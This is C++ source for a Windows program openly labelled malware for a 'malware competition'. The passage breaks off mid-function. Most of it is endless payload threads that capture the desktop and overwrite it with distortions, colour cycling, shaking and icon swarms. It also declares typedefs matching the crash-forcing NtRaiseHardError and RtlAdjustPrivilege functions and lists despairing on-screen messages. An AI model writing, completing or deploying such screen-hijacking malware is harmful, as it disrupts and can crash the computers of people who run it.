﻿// Levoglucosenone.cpp : definirajte tačku unosa aplikacije.
// 
// Levoglucosenone.exe:malware
// made for Nyexev(hexademical)'s malware competition.
// NO drawbytebeat&colorhsv in this malware lol
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define EE 2.7182818284590452353602874713526624977572
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma optimize("", off)
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
struct Point3D {
	float x, y, z;
};
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
int stage = 0, r = 0, g = 0, b = 0;
COLORREF Hue(int shift) { //credits to StaticBool for this function
	switch (stage) {
	case 0:
		r = 255;
		b = 0;
		g < 255 ? g += shift : stage++;
		break;
	case 1:
		g = 255;
		b = 0;
		r > 0 ? r -= shift : stage++;
		break;
	case 2:
		g = 255;
		r = 0;
		b < 255 ? b += shift : stage++;
		break;
	case 3:
		b = 255;
		r = 0;
		g > 0 ? g -= shift : stage++;
		break;
	case 4:
		b = 255;
		g = 0;
		r < 255 ? r += shift : stage++;
		break;
	case 5:
		r = 255;
		g = 0;
		b > 0 ? b -= shift : stage = 0;
		break;
	}
	return RGB(r, g, b);
}
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
VOID WINAPI ShakingBlt(HDC hdc, int a, int b, int screenWidth, int screenHeight, DWORD rop) {
	if (rand() % 2 == 0) { a = -a; }
	if (rand() % 2 == 0) { b = -b; }
	BitBlt(hdc, a, b, screenWidth, screenHeight, hdc, 0, 0, rop);
}
VOID WINAPI BlockBlt(HDC hdc, int screenWidth, int screenHeight, int size, DWORD rop) {
	for (int range = 0; range < 5; range++) {
		int x2 = -size + rand() % (screenWidth + size), y2 = -size + rand() % (screenHeight + size);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		BitBlt(hdc, x2, y2, size, size, hdc, x2 + rand() % 20 - 9, y2 + rand() % 20 - 9, rop);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
	}
}
COLORREF BlendPixel(COLORREF bg, COLORREF fg, BYTE alpha) {
	BYTE r = (GetRValue(fg) * alpha + GetRValue(bg) * (255 - alpha)) / 255;
	BYTE g = (GetGValue(fg) * alpha + GetGValue(bg) * (255 - alpha)) / 255;
	BYTE b = (GetBValue(fg) * alpha + GetBValue(bg) * (255 - alpha)) / 255;
	return RGB(r, g, b);
}
DWORD WINAPI Payload1_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	double angle = 0;
	while (true) {
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (float i = 0; i < w; i += 0.99f) {
			int a = asin(sinf(angle)) * 66;
			BitBlt(hdcCopy, i, 0, 1, h, hdcCopy, i, a, SRCCOPY);
			angle += PI / 800;
		}
		for (int i = 0; i < 5; i++) {
			int x = (w / 2) - rand() % w, y = (h / 2) - rand() % h;
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
			BitBlt(hdcCopy, 0, y, w, h, hdcCopy, 0, y, PATINVERT);
			BitBlt(hdcCopy, x, 0, w, h, hdcCopy, x, 0, PATINVERT);
			SelectObject(hdcCopy, hbrushCopy);
			DeleteObject(hbrush);
		}
		BlockBlt(hdcCopy, w, h, 268, PATCOPY);
		ShakingBlt(hdcCopy, 10, 10, w, h, SRCCOPY);
		for (int y = 0; y < h; y += 5) { StretchBlt(hdcCopy, -20 + rand() % 41, y, w, 5, hdcCopy, 0, y, w, 5, NOTSRCCOPY); }
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		ReleaseDC(0, hdc);
		Sleep(444);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				float fx = ((i | (1 - x)) ^ (i % (1 + y)) * ((1 - i) / 2));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		for (int x2 = 0; x2 < w; x2 += 50) {
			int rnd2 = 5 - (rand() % 11);
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
			StretchBlt(hdcCopy, x2, -rnd2, 50, h + rnd2, hdcCopy, x2, rnd2, 50, h, SRCBRUSH);
			SelectObject(hdcCopy, hbrushCopy);
			DeleteObject(hbrush);
		}
		ShakingBlt(hdcCopy, 10, 10, w, h, SRCCOPY);
		i++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload3_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	POINT pos[3];
	RECT rect;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	double angle = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int counter = acos(cosf(i / 20.f)) * 114, x = rand() % w, rn = rand() % 268, rROP = rand() % 6;
		DWORD rop = SRCCOPY;
		GetWindowRect(GetDesktopWindow(), &rect);
		pos[0].x = rect.left + counter;
		pos[0].y = rect.top - counter;
		pos[1].x = rect.right + counter;
		pos[1].y = rect.top + counter;
		pos[2].x = rect.left - counter;
		pos[2].y = rect.bottom - counter;
		PlgBlt(hdcCopy, pos, hdcCopy, rect.left - 20, rect.top - 20, (rect.right - rect.left) + 40, (rect.bottom - rect.top) + 40, 0, 0, 0);
		i++;
		for (float i = 0; i < h; i += 0.99f) {
			int a = tan(angle) * 44;
			BitBlt(hdcCopy, 0, i, w, 1, hdcCopy, a, i, SRCCOPY);
			angle += PI / 800;
		}
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		if (rROP == 0) { rop = PATINVERT; }
		if (rROP == 1) { rop = PATCOPY; }
		if (rROP == 2) { rop = SRCINVERT; }
		if (rROP == 3) { rop = MERGECOPY; }
		if (rROP == 4) { rop = RGBBRUSH; }
		if (rROP == 5) { rop = SRCBRUSH; }
		BitBlt(hdcCopy, x, 0, rn, h, hdcCopy, x, rand() % 268 - 68, rop);
		ShakingBlt(hdcCopy, 7, 7, w, h, SRCCOPY);
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload3_num2(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY), f;
	if (w > h) { f = h; }
	else { f = w; }
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll")), HIMAGERES = LoadLibrary(_T("Imageres.dll")), HMORICONS = LoadLibrary(_T("Moricons.dll")), HPIFMGR = LoadLibrary(_T("Pifmgr.dll")), HMMRES = LoadLibrary(_T("mmres.dll")), HCOMPSTUI = LoadLibrary(_T("compstui.dll"));
	while (true)
	{
		hdc = GetDC(0);
		int a = rand() % (f / 2), b = rand() % w, c = rand() % h, d = 1 + rand() % 32;
		HICON load[12] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)), LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)),LoadIcon(HMMRES, MAKEINTRESOURCE(3004 + (rand() % 17))), LoadIcon(HCOMPSTUI, MAKEINTRESOURCE(64000 + (rand() % 101))) };
		if (a != 0) {
			for (int x = 0; x <= w; x += d * wdpi / 96) { DrawIcon(hdc, x, sqrt((float)(a * a) - ((x - b) * (x - b))) + c, load[rand() % 12]); }
			for (int y = 0; y <= h; y += d * hdpi / 96) { DrawIcon(hdc, sqrt((float)-((y - c) * (y - c) - (a * a))) + b, y, load[rand() % 12]); }
			for (int x = 0; x <= w; x += d * wdpi / 96) { DrawIcon(hdc, x, -sqrt((float)(a * a) - ((x - b) * (x - b))) + c, load[rand() % 12]); }
			for (int y = 0; y <= h; y += d * hdpi / 96) { DrawIcon(hdc, -sqrt((float)-((y - c) * (y - c) - (a * a))) + b, y, load[rand() % 12]); }
		}
		ReleaseDC(NULL, hdc);
		Sleep(99);
	}
	return 0;
}
DWORD WINAPI Payload3_num3(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY), f;
	if (w > h) { f = h; }
	else { f = w; }
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll")), HIMAGERES = LoadLibrary(_T("Imageres.dll")), HMORICONS = LoadLibrary(_T("Moricons.dll")), HPIFMGR = LoadLibrary(_T("Pifmgr.dll")), HMMRES = LoadLibrary(_T("mmres.dll")), HCOMPSTUI = LoadLibrary(_T("compstui.dll"));
	while (true)
	{
		hdc = GetDC(0);
		int a = rand() % (f / 2), b = rand() % w, c = rand() % h, d = 1 + rand() % 32;
		HICON load[12] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)), LoadIcon(GetModuleHandleA(0), MAKEINTRESOURCE(107)),LoadIcon(HMMRES, MAKEINTRESOURCE(3004 + (rand() % 17))), LoadIcon(HCOMPSTUI, MAKEINTRESOURCE(64000 + (rand() % 101))) };
		if (a != 0) {
			for (int x = b; x <= a + b; x += d * wdpi / 96) { DrawIcon(hdc, x, c, load[rand() % 12]); }
			for (int y = c; y <= a + c; y += d * hdpi / 96) { DrawIcon(hdc, b, y, load[rand() % 12]); }
			for (int x = b; x <= a + b; x += d * wdpi / 96) { DrawIcon(hdc, x, a + c, load[rand() % 12]); }
			for (int y = c; y <= a + c; y += d * hdpi / 96) { DrawIcon(hdc, a + b, y, load[rand() % 12]); }
		}
		ReleaseDC(NULL, hdc);
		Sleep(99);
	}
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (x + (i * 4)) - (y + (i * cbrt(x & y | x ^ y) * 4));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 500.f + y / h * .2f, .5f);
				hslcolor.s = fmod(fx / 10.f + y / w * .1f, 1.5f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam)
{
	int qi = 0, j = 0, k = 1, w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(ColorTemp), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ColorTemp* data = (ColorTemp*)MyMemoryAddress;
	HDC hdc = GetDC(0), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, NULL, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		j += k;
		hdc = GetDC(0);
		GetDIBits(hdcCopy, bmp, 0, h, data, &bmpi, DIB_RGB_COLORS);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w - w / 2, y = i / w - h / 2;
			float angle = atan2f(y, x) * 180 / EE, radius = (sqrt(x + y + i) * acos(sinf(y)));
			int color_val = int(angle * 2 + radius + qi) % 768;
			ColorTemp vortex;
			if (color_val < 256) {
				vortex.r = 0;
				vortex.g = color_val;
				vortex.b = 1;
			}
			else if (color_val < 512) {
				vortex.r = 1;
				vortex.g = color_val;
				vortex.b = color_val;
			}
			else {
				vortex.r = color_val - 512;
				vortex.g = 1;
				vortex.b = color_val - 512;
			}
			BYTE alpha = (31 * asin(sinf(radius / 25.f))) - 16;
			COLORREF result = BlendPixel(
				RGB(data[i].r, data[i].g, data[i].b),
				RGB(vortex.r, vortex.g, vortex.b),
				alpha
			);
			data[i].r = GetRValue(result);
			data[i].g = GetGValue(result);
			data[i].b = GetBValue(result);
		}
		SetDIBitsToDevice(hdcCopy, 0, 0, w, h, 0, 0, 0, h, data, &bmpi, DIB_RGB_COLORS);
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(0, hdc);
		qi += 24;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				double fx = ((i ^ 6) + (i * 9) * ilogbl((x ^ i + i + y & x + i * y ^ i)));
				double fx2 = 3000000 / ((i & 2047) + 1) | ((i & (x ^ y)) + (y | (~i >> x)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (float)fmod(hslcolor.h + (fx * fx) / 15000.f + .09f, 1.f);
				hslcolor.h += (float)fmod(fx2 / 400.f + y / h * .2f, 1.f);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) { hslcolor.l += .2f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				double fx = floor((i ^ 4) + (i * 4) * cbrtf((x * (i ^ (i * y - x)) + (y + i * x)) * (i & x - y) - (i * y)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 1500.f + y / h * .2f, .6f);
				hslcolor.s = 1.f;
				if (hslcolor.l < .4f) { hslcolor.l += .2f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		ShakingBlt(hdcCopy, 11, 11, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload7_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), a;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	if (w > h) { a = rand() % (h / 8); }
	else { a = rand() % (w / 8); }
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	LPCSTR text[16] = {
		"Levoglucosenone.exe",
		"LambdaTechnology Studio",
		"I fell so trapped.",
		"being rotten......",
		"why bother?",
		"regretting my choice",
		"begging for mercy",
		"the nightmare is coming",
		"I'm such a big failure",
		"hopelessness",
		"no freedom here.",
		"without any sense.",
		"another meaningless life.",
		"the body is being petrified.",
		"67 is not fun.",
		"𓎉𓐤𓅟ﬀﬁﬂﬃﬄﬅﬆﬓﬔﬕﬖﬗ⡧⡨⡧⡗⠭⠬⠪⠩⢏⢺⢿ﷲؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓçéêèÿ°­òâÉÊËÌÍÎÏÐ₧ؓؓؓ🏡🛀🈁🤣💵😙💶📙🔄🐰🎥🌫😒🕖🚢﷽ʚɞ༺༻꧁꧂ʚΐɞઇଓ꧁༺๑๑༻꧂🏡🛀🈁🤣💵😙💶📙🔄🐰🎥🌫😒🕖🚢𒅒𒈔𒅒𒇫𒄆𒅒𒈔𒅒𒇫𒄆"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int tmp = rand() % 16;
		SetBkColor(hdcCopy, RndRGB);
		SetTextColor(hdcCopy, RndRGB);
